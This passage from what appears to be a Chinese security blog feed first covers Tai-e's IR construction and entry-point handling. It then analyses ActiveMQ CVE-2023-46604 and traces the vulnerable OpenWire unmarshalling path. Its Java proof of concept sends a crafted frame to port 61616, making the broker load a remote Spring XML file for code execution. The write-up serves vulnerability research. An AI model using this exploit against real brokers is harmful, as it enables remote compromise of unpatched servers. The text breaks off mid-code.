JDK version,</span></span><br><span class="line">            <span class="comment">// thus we filter out null</span></span><br><span class="line">            .filter(Objects::nonNull)</span><br><span class="line">            .toList());</span><br><span class="line">    <span class="comment">// initialize IR builder</span></span><br><span class="line">    world.setNativeModel(getNativeModel(typeSystem, hierarchy, options));</span><br><span class="line">    <span class="type">IRBuilder</span> <span class="variable">irBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRBuilder</span>(converter);</span><br><span class="line">    world.setIRBuilder(irBuilder);</span><br><span class="line">    <span class="keyword">if</span> (options.isPreBuildIR()) &#123;</span><br><span class="line">        irBuilder.buildAll(hierarchy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里对World进行初始化。</p><p>赋值呢？</p><h4 id="1-World-ClassHierarchy"><a href="#1-World-ClassHierarchy" class="headerlink" title="1. World.ClassHierarchy"></a>1. World.ClassHierarchy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildClasses</span><span class="params">(ClassHierarchy hierarchy, Scene scene)</span> &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> parallelize?</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(scene.getClasses()).forEach(c -&gt;</span><br><span class="line">            hierarchy.getDefaultClassLoader().loadClass(c.getName()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-World-irBuilder"><a href="#2-World-irBuilder" class="headerlink" title="2. World.irBuilder"></a>2. World.irBuilder</h4><p>在最后，如果prebuildIR为true，通过<code>irBuilder = new IRBuilder(converter);</code> &amp; <code>irBuilder.buildAll(hierarchy)</code>; 进行了tai-e IR构建。</p><p>如果prebuildIR false呢，只是不在这里构建IR，而是在后续以需要的时候构建，在pta指针分析中，其调用栈如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">build:209, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">buildIR:53, IRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">getIR:192, JMethod (pascal.taie.language.classes)</span><br><span class="line">setSolver:91, ThreadHandler (pascal.taie.analysis.pta.plugin)</span><br><span class="line">lambda$setSolver$0:94, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$239/0x0000000800eb1288 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">setSolver:94, CompositePlugin </span><br></pre></td></tr></table></figure><p>一直要在当需要获取当前节点的IR时，进行build。</p><h3 id="2-2-4-Converter逻辑"><a href="#2-2-4-Converter逻辑" class="headerlink" title="2.2.4 Converter逻辑"></a>2.2.4 Converter逻辑</h3><p>Tai-e的IR和Soot的IR是不一样的，但是一开始Tai-e又用到soot去获取待分析jar的类、IR等信息，具体在哪里作的转换呢？</p><p>pascal.taie.frontend.soot目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── Converter.java</span><br><span class="line">├── IRBuilder.java</span><br><span class="line">├── MethodIRBuilder.java</span><br><span class="line">├── Modifiers.java</span><br><span class="line">├── SootClassBuilder.java</span><br><span class="line">├── SootClassLoader.java</span><br><span class="line">├── SootFrontendException.java</span><br><span class="line">├── SootWorldBuilder.java</span><br><span class="line">└── VarManager.java</span><br></pre></td></tr></table></figure><p>在上面的World.irBuilder 例子中，就是将SootMethod转化为Tai-e IR。</p><h4 id="MethodIRBuilder-build"><a href="#MethodIRBuilder-build" class="headerlink" title="MethodIRBuilder#build"></a>MethodIRBuilder#build</h4><p>MethodIRBuilder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">IR <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SootMethod</span> <span class="variable">m</span> <span class="operator">=</span> (SootMethod) method.getMethodSource();</span><br><span class="line">    <span class="type">Body</span> <span class="variable">body</span> <span class="operator">=</span> m.retrieveActiveBody();</span><br><span class="line">    m.releaseActiveBody(); <span class="comment">// release body to save memory</span></span><br><span class="line">    varManager = <span class="keyword">new</span> <span class="title class_">VarManager</span>(method, converter);</span><br><span class="line">    <span class="keyword">if</span> (method.getReturnType().equals(VOID)) &#123;</span><br><span class="line">        returnVars = Set.of();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        returnVars = Sets.newLinkedSet();</span><br><span class="line">    &#125;</span><br><span class="line">    stmts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (!method.isStatic()) &#123;</span><br><span class="line">        buildThis(body.getThisLocal());</span><br><span class="line">    &#125;</span><br><span class="line">    buildParams(body.getParameterLocals());</span><br><span class="line">    preprocessTemps(body,</span><br><span class="line">            tempToDef = Maps.newHybridMap(),</span><br><span class="line">            unusedInvokeTempRets = Sets.newHybridSet());</span><br><span class="line">    buildStmts(body);</span><br><span class="line">    buildExceptionEntries(body);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultIR</span>(method,</span><br><span class="line">            varManager.getThis(), varManager.getParams(), returnVars,</span><br><span class="line">            varManager.getVars(), stmts, exceptionEntries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的Soot IR也类似，不赘述。</p><h1 id="0x03-拓展"><a href="#0x03-拓展" class="headerlink" title="0x03 拓展"></a>0x03 拓展</h1><h2 id="3-1-World应用"><a href="#3-1-World应用" class="headerlink" title="3.1 World应用"></a>3.1 World应用</h2><p>World 在哪些地方用到呢？</p><h2 id="3-2-Main-限制"><a href="#3-2-Main-限制" class="headerlink" title="3.2 Main 限制"></a>3.2 Main 限制</h2><p>Y4er师傅的文章中也提到了Tai-e 在PTA 分析中的Main 函数限制怎么突破，其实我们从以上的逻辑中，不难发现Main函数的限制是怎么产生的：</p><ol><li><img src="/images/pasted-705.png" alt="upload successful"></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// process program main method</span></span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">mainMethod</span> <span class="operator">=</span> World.get().getMainMethod();</span><br><span class="line">    <span class="keyword">if</span> (mainMethod != <span class="literal">null</span>) &#123;</span><br><span class="line">        solver.addEntryPoint(<span class="keyword">new</span> <span class="title class_">EntryPoint</span>(mainMethod,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MainEntryPointParamProvider</span>(mainMethod, solver)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// process implicit entries</span></span><br><span class="line">    <span class="keyword">if</span> (solver.getOptions().getBoolean(<span class="string">&quot;implicit-entries&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (JMethod entry : World.get().getImplicitEntries()) &#123;</span><br><span class="line">            solver.addEntryPoint(<span class="keyword">new</span> <span class="title class_">EntryPoint</span>(entry, EmptyParamProvider.get()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>疑问？soot只有一个MainMethod吗？多个怎么办？</p><p>如何突破Main限制，可以看<a href="(https://github.com/pascal-lab/Tai-e/issues/19)">Y4er师傅提到的参考【3】</a></p><blockquote><p>TODO: 如何解决Y4er师傅提到的Main Entry问题？</p></blockquote><h2 id="3-3-implicit-Entries-隐式入口"><a href="#3-3-implicit-Entries-隐式入口" class="headerlink" title="3.3 implicit Entries 隐式入口"></a>3.3 implicit Entries 隐式入口</h2><p><img src="/images/pasted-716.png" alt="upload successful"></p><p>AbstractWorldBuilder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractWorldBuilder</span> <span class="keyword">implements</span> <span class="title class_">WorldBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; implicitEntries = List.of(</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.System: void initializeSystemClass()&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.Thread: void &lt;init&gt;(java.lang.ThreadGroup,java.lang.Runnable)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.Thread: void &lt;init&gt;(java.lang.ThreadGroup,java.lang.String)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.Thread: void exit()&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ThreadGroup: void &lt;init&gt;()&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ThreadGroup: void &lt;init&gt;(java.lang.ThreadGroup,java.lang.String)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ThreadGroup: void uncaughtException(java.lang.Thread,java.lang.Throwable)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ClassLoader: void &lt;init&gt;()&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ClassLoader: java.lang.Class loadClassInternal(java.lang.String)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ClassLoader: void checkPackageAccess(java.lang.Class,java.security.ProtectionDomain)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ClassLoader: void addClass(java.lang.Class)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.lang.ClassLoader: long findNative(java.lang.ClassLoader,java.lang.String)&gt;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&lt;java.security.PrivilegedActionException: void &lt;init&gt;(java.lang.Exception)&gt;&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>实际jdk17下<br><img src="/images/pasted-717.png" alt="upload successful"></p><p>分析完毕，输出统计信息<br><img src="/images/pasted-718.png" alt="upload successful"></p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><ol><li><a href="https://tai-e.pascal-lab.net/docs/current/reference/en/program-abstraction.html">Program Abstraction in Tai-e (core classes and IR)</a></li><li><a href="https://github.com/knownsec/KCon/blob/master/2023/Tai-e-%20%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%A1%86%E6%9E%B6%20%20.pdf">Tai-e:基于程序分析的安全漏洞检测框架</a></li><li><a href="https://github.com/pascal-lab/Tai-e/issues/19">How to analyze java web or spring project(by:Y4er)</a></li><li><a href="https://www.bilibili.com/video/BV1XP4y1S7cP/?spm_id_from=333.999.0.0">静态程序分析框架“太阿”的设计之道</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;两位老师在介绍Tai-e的时候，都会提到Tai-e的IR设计，会比Soot的更直观，这里具体看看Tai-e的IR设计及实现。&lt;/p&gt;
&lt;p&gt;还是先给个老师演示Tai-e的IR例子。&lt;/p&gt;
&lt;h1 id=&quot;0x01-Tai-e-IR&quot;&gt;&lt;a href=&quot;#0x01-Tai-e-IR&quot; class=&quot;headerlink&quot; title=&quot;0x01 Tai-e IR&quot;&gt;&lt;/a&gt;0x01 Tai-e IR&lt;/h1&gt;&lt;h2 id=&quot;1-1-Soot-VS-Tai-e&quot;&gt;&lt;a href=&quot;#1-1-Soot-VS-Tai-e&quot; class=&quot;headerlink&quot; title=&quot;1.1 Soot VS Tai-e&quot;&gt;&lt;/a&gt;1.1 Soot VS Tai-e&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-738.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="静态分析" scheme="http://m0d9.me/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Tai-e" scheme="http://m0d9.me/tags/Tai-e/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ CVE-2023-46604漏洞分析</title>
    <link href="http://m0d9.me/2023/09/20/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2023/09/20/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-09-20T12:56:00.000Z</published>
    <updated>2025-06-11T11:57:04.351Z</updated>
    
    <content type="html"><![CDATA[<p>ActiveMQ 的RCE 漏洞，直接从61616 端口默认协议上可触发，影响不小。</p><p>偷懒了当时只是验证了下没写分析，先在还得从头开始捡。</p><h1 id="0x01-补丁分析"><a href="#0x01-补丁分析" class="headerlink" title="0x01 补丁分析"></a>0x01 补丁分析</h1><p><a href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></p><p><img src="/images/pasted-826.png" alt="upload successful"></p><p>分析出补丁位置不难，经典的org.springframework.context.support.ClassPathXmlApplicationContext 利用场景，以前出过几次，印象中最近的是浅蓝的postgresql 用的就是这个sink利用链。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>已知sink点为 BaseDataStreamMarshaller#createThrowable，路径在<code>org.apache.activemq.openwire.v12</code>，其中openwire有不同版本，v开头，这里已v12 为例，往上回溯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BaseDataStreamMarshaller#createThrowable</span><br><span class="line">BaseDataStreamMarshaller#tightUnmarsalThrowable</span><br><span class="line">BaseDataStreamMarshaller#looseUnmarsalThrowable</span><br><span class="line">    MessageAckMarshaller#tightUnmarshal</span><br><span class="line">        ConnectionErrorMarshaller#tightUnmarshal</span><br><span class="line">        ExceptionResponseMarshaller#tightUnmarshal</span><br><span class="line">        OpenWireFormat#doUnmarshal</span><br><span class="line">            OpenWireFormat#unmarshal(ByteSequence sequence)</span><br><span class="line">                OpenWireFormat#unmarshal(DataInput dis)</span><br><span class="line">            OpenWireFormat#tightUnmarshalNestedObject</span><br></pre></td></tr></table></figure><p>其实跟踪到这里已经ok了，搭配上断点调试，已经可以定位出漏洞触发路径。</p><h2 id="2-1-run-gt-sink链"><a href="#2-1-run-gt-sink链" class="headerlink" title="2.1 run-&gt;sink链"></a>2.1 run-&gt;sink链</h2><p>后续的触发路径还有很多，这里以tcp为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OpenWireFormat#unmarshal</span><br><span class="line">TcpTransport#readCommand</span><br><span class="line">    TcpTransport#doRun</span><br><span class="line">        TcpTransport#run</span><br></pre></td></tr></table></figure><p>TcpTransport 是个Runable 类，run 是其接口，那么只要启动TcpTransport线程，那么到sink链就通了</p><p><img src="/images/pasted-711.png" alt="upload successful"></p><h2 id="2-2-source-gt-start链"><a href="#2-2-source-gt-start链" class="headerlink" title="2.2 source-&gt;start链"></a>2.2 source-&gt;start链</h2><p>从source 继续往上推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socket.getInputStream</span><br><span class="line">TcpTransport#initializeStreams</span><br><span class="line">TcpTransport#connect</span><br><span class="line">        TcpTransport#doStart</span><br><span class="line">TransportThreadSupport#doStart                </span><br></pre></td></tr></table></figure><p>TransportThreadSupport#doStart</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doStart</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    runner = <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="built_in">this</span>, <span class="string">&quot;ActiveMQ Transport: &quot;</span> + toString(), stackSize);</span><br><span class="line">    runner.setDaemon(daemon);</span><br><span class="line">    runner.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TcpTransport#doStart</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TcpTransport</span> <span class="keyword">extends</span> <span class="title class_">TransportThreadSupport</span> <span class="keyword">implements</span> <span class="title class_">Transport</span>, Service, Runnable &#123;</span><br><span class="line">TcpTransport <span class="keyword">extends</span> <span class="title class_">TransportThreadSupport</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doStart</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        connect();</span><br><span class="line">        stoppedLatch.set(<span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="built_in">super</span>.doStart();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-start-gt-run"><a href="#2-3-start-gt-run" class="headerlink" title="2.3 start -&gt; run"></a>2.3 start -&gt; run</h2><blockquote><p>疑问：<br>Java thread#start 是在JNI实现上，实际调用的是run 接口，这在代码AST 上是无法追踪的，如何完善这一块？</p></blockquote><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="3-1-环境"><a href="#3-1-环境" class="headerlink" title="3.1 环境"></a>3.1 环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim bin/env</span><br><span class="line">ACTIVEMQ_DEBUG_OPTS=<span class="string">&quot;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005&quot;</span></span><br><span class="line">$ ./bin/activemq</span><br></pre></td></tr></table></figure><h2 id="3-2-POC"><a href="#3-2-POC" class="headerlink" title="3.2 POC"></a>3.2 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExceptionResponseMarshallerPoc</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BROKER_URL</span> <span class="operator">=</span> <span class="string">&quot;tcp://localhost:61616&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Boolean</span> <span class="variable">NON_TRANSACTED</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">TIMEOUT</span> <span class="operator">=</span> <span class="number">20000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String ip=<span class="string">&quot;&quot;</span>; <span class="comment">//服务器端ip地址</span></span><br><span class="line">        <span class="type">int</span> port=<span class="number">61616</span>; <span class="comment">//端口号</span></span><br><span class="line">        Socket sck=<span class="keyword">new</span> <span class="title class_">Socket</span>(ip,port);</span><br><span class="line">        <span class="comment">//2.传输内容</span></span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        out = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">        out.writeInt(<span class="number">32</span>);</span><br><span class="line">        out.writeByte(<span class="number">31</span>);</span><br><span class="line">        out.writeInt(<span class="number">1</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeInt(<span class="number">1</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeUTF(<span class="string">&quot;http://127.0.0.1/spring_poc.xml&quot;</span>);</span><br><span class="line">        out.close();</span><br><span class="line">        in = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">        OutputStream os=sck.getOutputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> in.available();</span><br><span class="line">        <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line">        in.readFully(buf);</span><br><span class="line">        os.write(buf);</span><br><span class="line">        in.close();</span><br><span class="line">        sck.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-横向拓展"><a href="#0x04-横向拓展" class="headerlink" title="0x04 横向拓展"></a>0x04 横向拓展</h1><h2 id="4-1-其他协议"><a href="#4-1-其他协议" class="headerlink" title="4.1 其他协议"></a>4.1 其他协议</h2><p>activemq 有其他协议，大家往往关注的是默认的61616 tcp协议，其实从原理分析过程来看，其他协议也存在问题。</p><p>例如udp 协议上也有问题：<br><img src="/images/pasted-841.png" alt="upload successful"></p><p>不过最终的修复点是在sink点上，对newInstance 增加了过滤，因此这些路径也都被修复了。</p><h2 id="4-2-安全手段"><a href="#4-2-安全手段" class="headerlink" title="4.2 安全手段"></a>4.2 安全手段</h2><h3 id="4-2-1-反序列化安全"><a href="#4-2-1-反序列化安全" class="headerlink" title="4.2.1 反序列化安全"></a>4.2.1 反序列化安全</h3><h4 id="4-2-1-1-InputStream"><a href="#4-2-1-1-InputStream" class="headerlink" title="4.2.1.1 InputStream"></a>4.2.1.1 InputStream</h4><h5 id="MessageDatabaseObjectInputStream"><a href="#MessageDatabaseObjectInputStream" class="headerlink" title="MessageDatabaseObjectInputStream"></a>MessageDatabaseObjectInputStream</h5><p>MessageDatabaseObjectInputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MessageDatabaseObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MessageDatabaseObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(desc.getName().startsWith(<span class="string">&quot;java.lang.&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;com.thoughtworks.xstream&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;java.util.&quot;</span>)</span><br><span class="line">                || desc.getName().length() &gt; <span class="number">2</span> &amp;&amp; desc.getName().substring(<span class="number">2</span>).startsWith(<span class="string">&quot;java.util.&quot;</span>) <span class="comment">// Allow arrays</span></span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;org.apache.activemq.&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>白名单模式</li><li>可能还有操作空间的只有xstream/activemq 这几个类</li></ul><h5 id="ClassLoadingAwareObjectInputStream"><a href="#ClassLoadingAwareObjectInputStream" class="headerlink" title="ClassLoadingAwareObjectInputStream"></a>ClassLoadingAwareObjectInputStream</h5><p>ClassLoadingAwareObjectInputStream.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoadingAwareObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] serializablePackages;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        serializablePackages = System.getProperty(<span class="string">&quot;org.apache.activemq.SERIALIZABLE_PACKAGES&quot;</span>,<span class="string">&quot;java.lang,org.apache.activemq,org.fusesource.hawtbuf,com.thoughtworks.xstream.mapper&quot;</span>).split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 